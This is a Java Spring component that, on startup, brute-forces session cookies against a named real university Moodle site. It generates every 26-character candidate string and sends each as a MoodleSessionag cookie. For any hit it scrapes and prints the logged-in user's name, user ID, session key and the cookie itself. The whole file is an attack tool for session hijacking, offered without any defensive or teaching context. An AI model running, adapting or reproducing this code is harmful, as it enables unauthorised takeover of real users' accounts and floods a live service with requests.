package com.example.demo.call;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.select.Elements;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpMethod;
import org.springframework.http.ResponseEntity;
import org.springframework.scheduling.annotation.Async;
import org.springframework.scheduling.annotation.EnableScheduling;
import org.springframework.stereotype.Component;
import org.springframework.web.client.ResourceAccessException;
import org.springframework.web.client.RestTemplate;

import javax.annotation.PostConstruct;
import java.io.IOException;
import java.net.ProtocolException;

@Component
@EnableScheduling
public class CheckSession {

    String[] chars = {"a",
            "b",
            "c",
            "e",
            "f",
            "g",
            "h",
            "i",
            "j",
            "k",
            "l",
            "m",
            "n",
            "o",
            "p",
            "q",
            "r",
            "s",
            "t",
            "u",
            "v",
            "w",
            "x",
            "y",
            "z",
            "0",
            "1",
            "2",
            "3",
            "4",
            "5",
            "6",
            "7",
            "8",
            "9"};

    void printAllKLength(int k) {
        int n = this.chars.length;
        printAllKLengthRec("", n, k);
    }

    // The main recursive method
// to print all possible
// strings of length k
    void printAllKLengthRec(String prefix,
                            int n, int k) {

        // Base case: k is 0,
        // print prefix
        if (k == 0) {
            this.makeCall(prefix);
            return;
        }

        // One by one add all characters
        // from set and recursively
        // call for k equals to k-1
        for (int i = 0; i < n; ++i) {

            // Next character of input added
            String newPrefix = prefix + this.chars[i];

            // k is decreased, because
            // we have added a new character
            printAllKLengthRec(newPrefix,
                    n, k - 1);
        }
    }


    @PostConstruct
    @Async
    public void test() throws IOException {
        printAllKLength(26);
    }


    public void makeCall(String moodleSessAg) {
        try {
            RestTemplate restTemplate = new RestTemplate();
            HttpHeaders headers = new HttpHeaders();
            headers.add("Cookie", "MoodleSessionag=" + moodleSessAg);

            ResponseEntity<String> response = restTemplate.exchange("https://aulaglobal.uc3m.es/",
                    HttpMethod.GET,
                    new HttpEntity<>(headers),
                    String.class);
            String html = response.getBody();
            Document d = Jsoup.parse(html);
            Elements els = d.getElementsByClass("logininfo");
            String username = els.get(0).text().replace(" (Cerrar sesión)", "");
            String userid = els.get(0).getElementsByTag("a").get(0).attr("href").replace("https://aulaglobal.uc3m.es/user/profile.php?id=", "");
            String sessKey = els.get(0).getElementsByTag("a").get(1).attr("href").replace("https://aulaglobal.uc3m.es/login/logout.php?sesskey=", "");
            System.out.println("User found!: " + username + " / USER_ID = " + userid + " / SESS_KEY = " + sessKey + " / M_SESS_AG = " + moodleSessAg);
        } catch (ResourceAccessException pe) {

        }
    }
}
